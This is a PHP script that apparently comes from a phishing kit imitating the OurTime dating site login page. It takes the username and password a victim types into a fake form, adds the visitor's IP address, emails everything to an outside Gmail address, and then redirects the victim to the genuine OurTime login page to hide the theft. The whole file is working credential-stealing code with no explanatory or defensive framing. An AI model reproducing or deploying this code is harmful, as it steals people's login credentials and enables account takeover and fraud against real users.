<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || ourtime || :------\n";
$message .= "User: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || THckingE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="williamclough95@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://www.ourtime.com/v3/login?CPSessionID=9cacecd6-26c1-4ad4-8019-f932e7808879&VisitorID=14469841062");
?>